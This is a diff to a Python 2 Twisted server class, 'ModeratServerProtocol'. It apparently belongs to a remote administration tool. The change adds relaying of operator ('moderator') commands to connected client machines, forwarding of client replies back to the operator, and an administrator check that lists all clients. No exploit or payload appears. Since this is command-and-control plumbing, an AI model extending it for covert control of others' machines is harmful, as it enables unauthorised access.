@@ -60,12 +60,12 @@ class ModeratServerProtocol(Protocol):
         command = self.recieve_message(data)
         # Switch to client commands
         if command['from'] == 'client':
-            self.client_commands(command['payload'], command['mode'])
+            self.client_commands(command['payload'], command['mode'], command['session_id'])
         # Switch to moderator commands
         elif command['from'] == 'moderator':
             self.moderator_commands(command)
 
-    def client_commands(self, payload, mode):
+    def client_commands(self, payload, mode, session_id):
 
         # Clients Initializing
         if mode == 'clientInitializing':
@@ -110,6 +110,10 @@ class ModeratServerProtocol(Protocol):
                 'socket':               self,
             }
 
+        else:
+            log.info('Send data to %s' % moderators[session_id]['username'])
+            self.send_message_to_moderator(moderators[session_id]['socket'], payload, mode)
+
     def moderator_commands(self, data):
 
         if data['mode'] == 'moderatorInitializing':
@@ -130,7 +134,7 @@ class ModeratServerProtocol(Protocol):
 
                         # Create Session For Moderator and Save
                         log.info('Create Session for Moderator (%s)' % data['session_id'])
-                        moderators[data['session_id']] = {'username': username}
+                        moderators[data['session_id']] = {'username': username, 'socket': self}
 
                     # if Login Not Success
                     else:
@@ -139,7 +143,11 @@ class ModeratServerProtocol(Protocol):
 
         # Check if session id is active
         elif data['mode'] == 'getClients' and data['session_id'] in moderators:
-            clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
+
+            if self.is_administrator(data['session_id']):
+                clients_ids = manageClients.get_all_clients()
+            else:
+                clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
             shared_clients = {}
 
             # for online clients
@@ -175,19 +183,27 @@ class ModeratServerProtocol(Protocol):
 
             self.send_message_to_moderator(self, shared_clients, 'getClients')
 
+        # Send Commands To Clients
+        else:
+            log.info('Send Message to %s from %s' % (data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+
     def is_administrator(self, session_id):
-        print manageModerators.get_privs(moderators[session_id]['username'])
+        if manageModerators.get_privs(moderators[session_id]['username']) == 1:
+            return True
+        else:
+            return False
 
     def recieve_message(self, data, end='[ENDOFMESSAGE]'):
         return ast.literal_eval(data[:-len(end)].decode('utf-8'))
 
-    def send_message_to_client(self, client, message, mode, _from='server', end='[ENDOFMESSAGE]'):
+    def send_message_to_client(self, client, message, mode, _from='server', session_id='', end='[ENDOFMESSAGE]'):
         # Send Data Function
         message = {
             'payload': message,
             'mode': mode,
             'from': _from,
-            'to': '',
+            'session_id': session_id,
         }
         client.transport.write(str(message)+end)
 
